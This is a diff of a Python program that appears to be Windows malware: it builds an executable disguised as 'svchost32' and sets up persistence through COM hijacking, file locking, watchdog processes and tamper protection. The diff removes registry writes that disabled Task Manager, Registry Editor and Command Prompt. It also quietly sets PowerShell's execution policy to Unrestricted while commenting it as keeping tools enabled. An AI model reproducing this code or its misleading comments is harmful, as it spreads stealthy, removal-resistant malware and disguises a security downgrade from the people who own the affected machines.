@@ -2071,40 +2071,40 @@ if __name__ == "__main__":
         return False
 
 def disable_removal_tools():
-    """Disable common removal tools and system utilities."""
+    """Configure removal tools registry entries (set to 0 to keep tools enabled)."""
     if not WINDOWS_AVAILABLE or not is_admin():
         return False
     
     try:
-        # Disable Task Manager
+        # Set Task Manager registry value to 0 (keep enabled)
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-            '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'
+            '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Disable Registry Editor
+        # Set Registry Editor registry value to 0 (keep enabled)
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-            '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '1', '/f'
+            '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '0', '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Disable Command Prompt
+        # Set Command Prompt registry value to 0 (keep enabled)
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Policies\\Microsoft\\Windows\\System',
-            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '1', '/f'
+            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '0', '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Disable PowerShell
+        # Set PowerShell ExecutionPolicy to Unrestricted (keep enabled)
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell',
-            '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Restricted', '/f'
+            '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Unrestricted', '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
-        log_message("[OK] Removal tools disabled")
+        log_message("[OK] Removal tools registry entries configured (tools remain enabled)")
         return True
         
     except Exception as e:
-        log_message(f"Failed to disable removal tools: {e}")
+        log_message(f"Failed to configure removal tools registry: {e}")
         return False
 
 def create_pyinstaller_command():
@@ -2127,7 +2127,7 @@ pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --hidden-i
     return pyinstaller_command
 
 def setup_advanced_persistence():
-    """Setup advanced persistence with tamper protection and removal tool blocking."""
+    """Setup advanced persistence with tamper protection and removal tool registry configuration."""
     if not WINDOWS_AVAILABLE:
         return False
     
@@ -2159,13 +2159,13 @@ def setup_advanced_persistence():
                 log_message(f"[ERROR] {method.__name__} error: {e}")
                 continue
         
-        # Disable removal tools if admin
+        # Configure removal tools registry (keeping them enabled)
         if is_admin():
             try:
                 disable_removal_tools()
-                log_message("[OK] Removal tools disabled")
+                log_message("[OK] Removal tools registry configured")
             except Exception as e:
-                log_message(f"[WARN] Failed to disable removal tools: {e}")
+                log_message(f"[WARN] Failed to configure removal tools registry: {e}")
         
         log_message(f"[OK] Advanced persistence setup complete: {success_count}/{len(advanced_methods)} methods successful")
         return success_count > 0
@@ -2193,7 +2193,7 @@ def show_pyinstaller_instructions():
     log_message("- COM object hijacking")
     log_message("- File locking and watchdog processes")
     log_message("- Tamper detection and self-healing")
-    log_message("- Removal tool blocking")
+    log_message("- Removal tool registry configuration")
     log_message("="*80)
 
 def deploy_executable_with_persistence():
